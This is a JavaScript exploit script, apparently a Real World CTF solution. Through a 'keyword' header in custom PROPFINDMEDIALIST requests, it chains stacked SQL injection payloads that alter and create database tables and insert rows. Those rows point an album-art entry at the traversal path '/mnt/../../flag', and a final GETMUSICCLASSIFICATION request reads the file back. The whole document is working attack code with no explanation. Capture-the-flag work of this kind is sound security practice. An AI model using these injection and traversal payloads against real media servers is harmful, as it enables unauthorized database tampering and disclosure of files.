var author = "" + Math.random();
var path = "/mnt/../../flag";
var dId = Math.floor(100000 * Math.random()) + 10000
var oId = Math.floor(100000 * Math.random()) + 10000
var pId = Math.floor(100000 * Math.random()) + 10000

val = ("a' OR 1 );ALTER TABLE DETAILS ADD COLUMN ALBUM_ART INTEGER DEFAULT 0; -- ").split("'").join("%27")
console.log(val.length)
await fetch("/RWCTF", {
  "headers": {
    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});

val = ("a' OR 1 );ALTER TABLE DETAILS ADD COLUMN ARTIST TEXT COLLATE NOCASE; -- ").split("'").join("%27")
console.log(val.length)
await fetch("/RWCTF", {
  "headers": {
    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});

var val = ("a' OR 1 ); INSERT INTO DETAILS (TITLE, ALBUM_ART, ARTIST, ID) VALUES ('a', '" + pId + "', '" + author + "', " + dId + "); -- ").split("'").join("%27")
console.log(val.length)
await fetch("/RWCTF", {
  "headers": {
    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});

val = ("a' OR 1 ); CREATE TABLE ALBUM_ART (ID INTEGER PRIMARY KEY AUTOINCREMENT, PATH TEXT NOT NULL); -- ").split("'").join("%27")
console.log(val.length)
await fetch("/RWCTF", {
  "headers": {
    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});

val = ("a' OR 1 );CREATE TABLE OBJECTS(ID INTEGER PRIMARY KEY AUTOINCREMENT,OBJECT_ID TEXT UNIQUE NOT NULL,PARENT_ID TEXT NOT NULL,REF_ID TEXT,CLASS TEXT NOT NULL,DETAIL_ID INTEGER,NAME TEXT); -- ").split("'").join("%27")
console.log(val.length)
await fetch("/RWCTF", {
  "headers": {
    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});


val = ("a' OR 1 ); INSERT INTO OBJECTS (PARENT_ID, OBJECT_ID, DETAIL_ID, CLASS) VALUES ('1$7', " + oId + ", " + dId + ", 'container.album.musicAlbum'); -- ").split("'").join("%27")
console.log(val.length)

await fetch("/RWCTF", {
  "headers": {

    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});

val = ("a' OR 1 );  INSERT INTO ALBUM_ART (PATH, ID) VALUES ('" + path + "', " + pId + "); -- ").split("'").join("%27")
console.log(val.length)


await fetch("/RWCTF", {
  "headers": {
    "keyword": val,
    "mediatype": "1",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "PROPFINDMEDIALIST",
});

await fetch("/RWCTF", {
  "headers": {
    "classify": "album",
  },
  "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:getlastmodified/><D:getcontentlength/><D:getcontenttype/><D:getmatadata/></D:prop></D:propfind>",
  "method": "GETMUSICCLASSIFICATION"
}).then(a => a.text())

